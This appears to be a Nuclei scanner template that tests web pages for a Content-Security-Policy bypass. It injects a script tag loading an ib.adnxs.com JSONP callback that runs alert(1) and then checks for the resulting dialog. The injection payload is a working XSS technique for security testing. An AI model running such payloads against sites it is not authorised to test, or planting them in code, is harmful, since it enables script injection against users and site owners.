id: adnxs-ib-csp-bypass

info:
  name: Content-Security-Policy Bypass via Adnxs IB
  author: renniepak,DhiyaneshDK
  severity: medium
  reference:
    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
  metadata:
    verified: true
  tags: xss,csp-bypass,adnxs-ib

headless:
  - steps:
      - action: navigate
        args:
          url: "{{BaseURL}}"

      - action: waitdialog
        name: adnxs_ib_csp_xss
        args:
          max-duration: 5s

    payloads:
      injection:
        - '<script src="https://ib.adnxs.com/async_usersync?cbfn=alert(1)-"></script>'

    fuzzing:
      - part: query
        type: replace
        mode: single
        fuzz:
          - "{{url_encode(injection)}}"

    matchers:
      - type: dsl
        dsl:
          - "adnxs_ib_csp_xss == true"
